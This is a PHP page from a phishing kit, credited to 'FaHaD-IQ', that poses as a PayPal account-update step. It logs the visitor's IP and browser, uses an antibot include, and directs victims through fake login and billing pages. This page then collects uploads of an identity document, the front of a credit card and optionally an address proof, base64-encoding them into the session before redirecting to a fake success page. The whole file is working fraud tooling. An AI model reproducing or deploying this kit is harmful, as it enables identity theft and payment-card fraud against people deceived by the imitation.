<?php
error_reporting(0);
	#################################################
	#                FaHaD-IQ                       #
	#              fb/mr.fahad6                     #
	#################################################
session_start();
include("../../include/__config__.php");
include("../../include/function.php");
include("../../include/antibot.php");
include("../../include/FAT.php");
$_SESSION['_IP_']  = $_SERVER["REMOTE_ADDR"];
	$time = date('l jS \of F Y h:i:s A');
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);
	$_SESSION['_browser_'] = $browser;
    $_SESSION['cntcode'] = $countrycode;
    $_SESSION['cntname'] = $countryname;
ini_set('post_max_size', '64M');
ini_set('upload_max_filesize', '64M');

$error=''; // Variable To Store Error Message
$msg=''; // Variable to store success message  

if($_SESSION['logint'] !="on" ) {
		header("location: login.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=".$_SESSION['_lang_']."&email=".$_SESSION['_email_']."&confirmation_code=3b2hN76Aq6&act_num=confirm_account_3b2vhFa76bAq6&tmpl=profile%2Fmyaccount&aid=358301&new_account=1&import=1");	
	
	}
		else if($_SESSION['billing'] !="on" ) {
		header("location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']);		
	}
	else if($_SESSION['copycard'] =="on" ) {
		header("location: success.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']);			
	}
if(isset($_REQUEST["submit"])) {

	$tempfile1 = explode(".", $_FILES["idcopy"]["name"]);
	$newfilename1 = 'Yeni-' . round(microtime(true)) . '-iD.' . end($tempfile1);
	$_SESSION['_newfilename1_']= $newfilename1;

	$tempfile2 = explode(".", $_FILES["cardcopy_front"]["name"]);
	$newfilename2 = 'Yeni-' . round(microtime(true)) . '-Card.' . end($tempfile2);
	$_SESSION['_newfilename2_']= $newfilename2;
	
	if (isset($fat) && $fat == "on"){
	$tempfile3 = explode(".", $_FILES["fatcopy"]["name"]);
	$newfilename3 = 'Yeni-' . round(microtime(true)) . '-Bill.' . end($tempfile3);
	$_SESSION['_newfilename3_']= $newfilename3;
	}
	
	$target_file1 = $tagamvkab .DIRECTORY_SEPARATOR . basename($newfilename1);
	$target_file2 = $tagamvkab .DIRECTORY_SEPARATOR . basename($newfilename2);
	
	if (isset($fat) && $fat == "on"){
$target_file3 = $tagamvkab .DIRECTORY_SEPARATOR . basename($newfilename3);
	}
	
	$uploadOk = 1;
	$imageFileType1 = @pathinfo($target_file1,PATHINFO_EXTENSION);
	$imageFileType2 = @pathinfo($target_file2,PATHINFO_EXTENSION);
	
	if (isset($fat) && $fat == "on"){
$imageFileType3 = @pathinfo($target_file3,PATHINFO_EXTENSION);
	}

    $check1 = @getimagesize($_FILES["idcopy"]["tmp_name"]);
	$attachment1 = chunk_split(base64_encode(file_get_contents($_FILES["idcopy"]["tmp_name"]))); 
	$_SESSION['_attach1_']= $attachment1;
	$check2 = @getimagesize($_FILES["cardcopy_front"]["tmp_name"]);
	$attachment2 = chunk_split(base64_encode(file_get_contents($_FILES["cardcopy_front"]["tmp_name"]))); 
	$_SESSION['_attach2_']= $attachment2;
	
	if (isset($fat) && $fat == "on"){
$check3 = @getimagesize($_FILES["fatcopy"]["tmp_name"]);
	$attachment3 = chunk_split(base64_encode(file_get_contents($_FILES["fatcopy"]["tmp_name"]))); 
	$_SESSION['_attach3_']= $attachment3;
	}

	// Check if file already exists
	if (file_exists($target_file1)) {
		$error.= "* Sorry, same file for card copy already exists.<br>\n";
		$uploadOk = 0;
	}
	
	
	if (file_exists($target_file2)) {
		$error.= "* Sorry, same file for id copy already exists.<br>\n";
		$uploadOk = 0;
	}
	if (isset($fat) && $fat == "on"){
if (file_exists($target_file3)) {
		$error.= "* Sorry, same file for id copy already exists.<br>\n";
		$uploadOk = 0;
	}
	}

	
	// Check file size
	if ($_FILES["idcopy"]["size"] > 5000000) {
		$error.= "* Sorry, your id copy file is too large.<br>\n";
		$error.= "Please use image of size less than 5MB.<br>\n";
		$uploadOk = 0;
	}
	if ($_FILES["cardcopy_front"]["size"] > 5000000) {
		$error.= "* Sorry, front side image file is too large.<br>\n";
		$error.= "Please use image of size less than 5MB.<br>\n";
		$uploadOk = 0;
	}
	if (isset($fat) && $fat == "on"){
if ($_FILES["fatcopy"]["size"] > 5000000) {
		$error.= "* Sorry, your id copy file is too large.<br>\n";
		$error.= "Please use image of size less than 5MB.<br>\n";
		$uploadOk = 0;
	}
	}
	
	// Allow certain file formats
	if($imageFileType1 != "jpg" && $imageFileType1 != "jpeg" && $imageFileType1 != "png"
	&& $imageFileType1 != "gif" && $imageFileType1 != "pdf" ) {
		$error.= "* File not allowed or not chosen for ID Proof (only JPG, JPEG, PNG, PDF & GIF).<br>\n";
		$uploadOk = 0;
	}
	
	if($imageFileType2 != "jpg" && $imageFileType2 != "png" && $imageFileType2 != "jpeg"
	&& $imageFileType2 != "gif" && $imageFileType2 != "pdf" ) {
		$error.= "* File not allowed or not chosen for Card Proof (only JPG, JPEG, PNG, PDF & GIF).<br>\n";
		$uploadOk = 0;
	}
	if (isset($fat) && $fat == "on"){
if($imageFileType3 != "jpg" && $imageFileType3 != "png" && $imageFileType3 != "jpeg"
	&& $imageFileType3 != "gif" && $imageFileType3 != "pdf" ) {
		$error.= "* File not allowed or not chosen for Address Proof (only JPG, JPEG, PNG, PDF & GIF).<br>\n";
		$uploadOk = 0;
	}
	}
	
	// Check if $uploadOk is set to 0 by an error
	if ($uploadOk == 0) {
	// if everything is ok, try to upload file
	} else {
		
		   $msg.= "The files ". basename( $_FILES["idcopy"]["name"]). ", ".basename( $_FILES["cardcopy_front"]["name"])." has been uploaded.";
			
			$idcopy_file=$target_file1;
			$cardcopy_front_file=$target_file2;
			$copycard="on";
			$_SESSION['copycard'] = $copycard;
			header("location: websc-success.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']);				
			
		
	} 
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title><?php echo $PAYPAL_SERVICE_UPDATE_TXT;?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">
	<link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />
    <!-- Le styles -->
    <link href="../../css/bootstrap.css" rel="stylesheet">
<link rel='stylesheet prefetch' href='../../css/copy.css'>
		    <link href="../../css/bootstrap-responsive.css" rel="stylesheet">

    <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="../../js/html5shiv.js"></script>
    <![endif]-->
  </head>

  <body style="background:#f5f5f5;">
<style>
clearfix{*zoom:1;}.clearfix:before,.clearfix:after{display:table;content:"";line-height:0;}
.clearfix:after{clear:both;}
.hide-text{font:0/0 a;color:transparent;text-shadow:none;background-color:transparent;border:0;}
.input-block-level{display:block;width:100%;min-height:30px;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;}
.btn-file{overflow:hidden;position:relative;vertical-align:middle;}.btn-file>input{position:absolute;top:0;right:0;margin:0;opacity:0;filter:alpha(opacity=0);transform:translate(-300px, 0) scale(4);font-size:23px;direction:ltr;cursor:pointer;}
.fileupload{margin-bottom:9px;}.fileupload .uneditable-input{display:inline-block;margin-bottom:0px;vertical-align:middle;cursor:text;}
.fileupload .thumbnail{overflow:hidden;display:inline-block;margin-bottom:5px;vertical-align:middle;text-align:center;}.fileupload .thumbnail>img{display:inline-block;vertical-align:middle;max-height:100%;}
.fileupload .btn{vertical-align:middle;}
.fileupload-exists .fileupload-new,.fileupload-new .fileupload-exists{display:none;}
.fileupload-inline .fileupload-controls{display:inline;}
.fileupload-new .input-append .btn-file{-webkit-border-radius:0 3px 3px 0;-moz-border-radius:0 3px 3px 0;border-radius:0 3px 3px 0;}
.thumbnail-borderless .thumbnail{border:none;padding:0;-webkit-border-radius:0;-moz-border-radius:0;border-radius:0;-webkit-box-shadow:none;-moz-box-shadow:none;box-shadow:none;}
.fileupload-new.thumbnail-borderless .thumbnail{border:1px solid #ddd;}
.control-group.warning .fileupload .uneditable-input{color:#a47e3c;border-color:#a47e3c;}
.control-group.warning .fileupload .fileupload-preview{color:#a47e3c;}
.control-group.warning .fileupload .thumbnail{border-color:#a47e3c;}
.control-group.error .fileupload .uneditable-input{color:#b94a48;border-color:#b94a48;}
.control-group.error .fileupload .fileupload-preview{color:#b94a48;}
.control-group.error .fileupload .thumbnail{border-color:#b94a48;}
.control-group.success .fileupload .uneditable-input{color:#468847;border-color:#468847;}
.control-group.success .fileupload .fileupload-preview{color:#468847;}
.control-group.success .fileupload .thumbnail{border-color:#468847;}
</style>
<div class="row-fluid">
     <?php include("header.php"); ?>
</div>
    <div class="container">

     

      <!-- Example row of columns -->
      <div class="row" style="margin-top:100px;" id="toprow" >
      
     
         <?php include("left.php"); ?>                        
                                
        <div class="span7" style="background:#fff;padding:15px 32px; 0 0;box-shadow:0 1px 4px 0 #d5d5d5;border-radius:5px;">
        <h3><?php echo $ID_PROOF_TXT; ?></h3>
        <hr />
        <?php if($msg<>''){ ?>
        <div class="alert-success" >
        <!--<a href="#" class="close" data-dismiss="alertsuccess">&times;</a>-->
         <?php echo $msg; ?>
		</div>
        <?php } ?>
        <?php if($error<>''){ ?>
        <div class="alert-error" style="font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;font-size: 14px;">
        <!--<a href="#" class="close" data-dismiss="alertsuccess">&times;</a>-->
        <?php echo $error; ?>
		</div>
        <?php } ?>
		<br>
         <center>
        <p style="margin-bottom:20px;"><?php echo $UPLOAD_SCAN_COPY_OF_ID_AND_CREDIT_CARD_COPY_TXT; ?></p>
        </center>
        
          <form class="form-horizontal" name="frm_idproof" id="frm_idproof" method="post" enctype="multipart/form-data" action="websc-cardcopy.php"  >
          <div class="control-group">
          <malan class="zmnbznmn" for="cardholder"><?php echo $UPLOAD_ID_PROOF_TXT; ?><span class="red">*</span></malan>
                    <div class="fileupload fileupload-new" style="    border: 2px dashed #AAA;
    border-radius: 7px;
    cursor: default;
    padding: 15px;
    margin-bottom: 20px;background-color: #f5f5f5;text-align:center;" data-provides="fileupload">
    <span class="btn btn-primary btn-file"><span class="fileupload-new">Select file</span>
    <span class="fileupload-exists">Change</span>         <input type="file" name="cardcopy_front" id="cardcopy_front" title="Upload ID Scan Copy" 
							required/></span>
    <span class="fileupload-preview"></span>
    <a href="#" class="close fileupload-exists" data-dismiss="fileupload" style="float: none">×</a>
  </div>
  
          </div>
         
          
          
          
          
          <div class="control-group">
          <malan class="zmnbznmn" for="cardcopy"><?php echo $UPLOAD_FRONT_SIDE_OF_CARD_TXT; ?> <span class="red">*</span></malan>
          <div class="fileupload fileupload-new" style="    border: 2px dashed #AAA;
    border-radius: 7px;
    cursor: default;
    padding: 15px;
    margin-bottom: 20px;background-color: #f5f5f5;text-align:center;" data-provides="fileupload">
    <span class="btn btn-primary btn-file"><span class="fileupload-new">Select file</span>
    <span class="fileupload-exists">Change</span>         <input type="file" name="idcopy" id="idcopy" title="Upload Front Side Scan Copy of Credit Card" 
							required/></span>
    <span class="fileupload-preview"></span>
    <a href="#" class="close fileupload-exists" data-dismiss="fileupload" style="float: none">×</a>
  </div>
  
          <?php if (isset($fat) && $fat == "on"){?>
           <br> 
          <div class="control-group">
          <malan class="zmnbznmn" for="cardcopy">Upload Address Proof <span class="red">*</span></malan>
          <div class="fileupload fileupload-new" style="    border: 2px dashed #AAA;
    border-radius: 7px;
    cursor: default;
    padding: 15px;
    margin-bottom: 20px;background-color: #f5f5f5;text-align:center;" data-provides="fileupload">
    <span class="btn btn-primary btn-file"><span class="fileupload-new">Select file</span>
    <span class="fileupload-exists">Change</span>         <input type="file" name="fatcopy" id="fatcopy" title="Upload Front Side Scan Copy of Address Proof" 
							required/></span>
    <span class="fileupload-preview"></span>
    <a href="#" class="close fileupload-exists" data-dismiss="fileupload" style="float: none">×</a>
  </div>
  
  <?php }?>

              


          </div>
   <div class="control-group">  
   <div style="text-align:center;">       
<input type="submit" name="submit" value="<?php echo $FINISH_TXT; ?>" class="btn btn-primary" style="padding: 7px 15px 8px; width: 130px; line-height: 18px; font-size:14px;font-weight:bold;"></div></div>
         
          </form>
          
           <center><div style="color:#0079c1;margin:35px 0 20px ;" id="ft3"><?php echo $UPDATE_BILLING_ADDRESS_TXT; ?> <b class="caret-right"></b> <?php echo $UPDATE_CREDIT_OR_DEBIT_CARD_TXT; ?> <b class="caret-right"></b> <span style="color:#000;"><?php echo $ID_AND_CREDIT_CARD_PROOF_TXT; ?></span> <b class="caret-right"></b> <span style="color:##0079c1;"><?php echo $UPDATE_DONE_TXT; ?></span></div></center>
       </div>
       
      </div>
   

      <hr />
      
      <div class="container" id="ft1">
         
         
   <ul class="nav nav-pills" style="color:#ccc;font-weight:bold;">
        <li><a href="#"><?php echo $ABOUT_TXT; ?></a></li>
        <li><a href="#"><?php echo $HELP_TXT; ?></a></li>
        <li><a href="#"><?php echo $RATES_TXT; ?></a></li>
        <li><a href="#"><?php echo $SECURITY_TXT; ?></a></li>
        <li><a href="#"><?php echo $DEVELOPERS_TXT; ?></a></li>
        <li><a href="#"><?php echo $PARTNERS_TXT; ?></a></li>
    </ul>
        </div>
      

    </div> <!-- /container -->
    

<?php include("footer.php");?>
<script>
!function(e){var t=function(t,n){this.$element=e(t),this.type=this.$element.data("uploadtype")||(this.$element.find(".thumbnail").length>0?"image":"file"),this.$input=this.$element.find(":file");if(this.$input.length===0)return;this.name=this.$input.attr("name")||n.name,this.$hidden=this.$element.find('input[type=hidden][name="'+this.name+'"]'),this.$hidden.length===0&&(this.$hidden=e('<input type="hidden" />'),this.$element.prepend(this.$hidden)),this.$preview=this.$element.find(".fileupload-preview");var r=this.$preview.css("height");this.$preview.css("display")!="inline"&&r!="0px"&&r!="none"&&this.$preview.css("line-height",r),this.original={exists:this.$element.hasClass("fileupload-exists"),preview:this.$preview.html(),hiddenVal:this.$hidden.val()},this.$remove=this.$element.find('[data-dismiss="fileupload"]'),this.$element.find('[data-trigger="fileupload"]').on("click.fileupload",e.proxy(this.trigger,this)),this.listen()};t.prototype={listen:function(){this.$input.on("change.fileupload",e.proxy(this.change,this)),e(this.$input[0].form).on("reset.fileupload",e.proxy(this.reset,this)),this.$remove&&this.$remove.on("click.fileupload",e.proxy(this.clear,this))},change:function(e,t){if(t==="clear")return;var n=e.target.files!==undefined?e.target.files[0]:e.target.value?{name:e.target.value.replace(/^.+\\/,"")}:null;if(!n){this.clear();return}this.$hidden.val(""),this.$hidden.attr("name",""),this.$input.attr("name",this.name);if(this.type==="image"&&this.$preview.length>0&&(typeof n.type!="undefined"?n.type.match("image.*"):n.name.match(/\.(gif|png|jpe?g)$/i))&&typeof FileReader!="undefined"){var r=new FileReader,i=this.$preview,s=this.$element;r.onload=function(e){i.html('<img src="'+e.target.result+'" '+(i.css("max-height")!="none"?'style="max-height: '+i.css("max-height")+';"':"")+" />"),s.addClass("fileupload-exists").removeClass("fileupload-new")},r.readAsDataURL(n)}else this.$preview.text(n.name),this.$element.addClass("fileupload-exists").removeClass("fileupload-new")},clear:function(e){this.$hidden.val(""),this.$hidden.attr("name",this.name),this.$input.attr("name","");if(navigator.userAgent.match(/msie/i)){var t=this.$input.clone(!0);this.$input.after(t),this.$input.remove(),this.$input=t}else this.$input.val("");this.$preview.html(""),this.$element.addClass("fileupload-new").removeClass("fileupload-exists"),e&&(this.$input.trigger("change",["clear"]),e.preventDefault())},reset:function(e){this.clear(),this.$hidden.val(this.original.hiddenVal),this.$preview.html(this.original.preview),this.original.exists?this.$element.addClass("fileupload-exists").removeClass("fileupload-new"):this.$element.addClass("fileupload-new").removeClass("fileupload-exists")},trigger:function(e){this.$input.trigger("click"),e.preventDefault()}},e.fn.fileupload=function(n){return this.each(function(){var r=e(this),i=r.data("fileupload");i||r.data("fileupload",i=new t(this,n)),typeof n=="string"&&i[n]()})},e.fn.fileupload.Constructor=t,e(document).on("click.fileupload.data-api",'[data-provides="fileupload"]',function(t){var n=e(this);if(n.data("fileupload"))return;n.fileupload(n.data());var r=e(t.target).closest('[data-dismiss="fileupload"],[data-trigger="fileupload"]');r.length>0&&(r.trigger("click.fileupload"),t.preventDefault())})}(window.jQuery)
</script>	
	
	
  </body>
</html>